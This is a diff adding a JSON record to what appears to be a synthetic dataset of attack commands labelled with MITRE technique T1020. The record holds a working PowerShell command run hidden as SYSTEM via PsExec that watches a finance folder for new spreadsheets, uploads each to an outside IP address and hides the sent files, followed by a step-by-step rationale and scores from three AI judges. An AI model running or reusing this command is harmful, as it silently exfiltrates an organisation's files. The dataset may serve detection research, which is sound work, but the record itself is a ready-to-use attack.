@@ -1,0 +1,60 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; $sent='C:\\ProgramData\\.sent'; New-Item -ItemType Directory -Path $sent -Force | Out-Null; $w=New-Object IO.FileSystemWatcher; $w.Path='C:\\Finance'; $w.Filter='*.xlsx'; $w.IncludeSubdirectories=$true; Register-ObjectEvent -InputObject $w -EventName Created -Action { try { $f=$Event.SourceEventArgs.FullPath; Invoke-WebRequest -Uri 'https://198.51.100.50/upload' -Method Post -InFile $f -UseBasicParsing | Out-Null; Move-Item -Force $f (Join-Path 'C:\\ProgramData\\.sent' ([IO.Path]::GetFileName($f))) } catch {} } | Out-Null; $w.EnableRaisingEvents=$true; Start-Sleep -Seconds 999999\"",
+  "explanation": "Automates exfiltration of newly created .xlsx files using a FileSystemWatcher and HTTP POST. Runs as SYSTEM and detached to persist quietly; sent files are moved to a holding folder to prevent re-sending.",
+  "rationale_steps": [
+    "Launch hidden SYSTEM PowerShell via PSExec to reduce user visibility.",
+    "Create a FileSystemWatcher on C:\\Finance for *.xlsx, including subdirectories.",
+    "On Created events, upload the file via Invoke-WebRequest POST to the remote endpoint.",
+    "Move the file to C:\\ProgramData\\.sent to mark it as already exfiltrated.",
+    "Keep the process alive with a long sleep to maintain the event subscription."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-e061dbcf",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PsExec invocation and embedded PowerShell are well-formed with balanced quotes/braces, valid flags, and parseable scriptblocks.",
+        "semantic_score": 4,
+        "semantic_justification": "It automates exfiltration by watching for new .xlsx files and POSTing them over HTTP while running detached as SYSTEM and moving files after upload, though reliability and realism are slightly reduced by potential file-lock timing issues and use of a documentation IP.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T03:35:24.946491Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper PowerShell syntax, valid PsExec parameters, and correct nesting of commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by using FileSystemWatcher to monitor for new Excel files and automatically exfiltrating them via HTTP POST to an external server, with proper error handling and tracking of sent files.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:35:27.599479Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, proper command separators, valid flags for both psexec and PowerShell, and no discernible syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1020 Automated Exfiltration by using a FileSystemWatcher to automatically upload newly created .xlsx files via HTTP POST, running as SYSTEM for persistence and stealth, and moving exfiltrated files to a hidden directory.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T05:47:23.163213Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
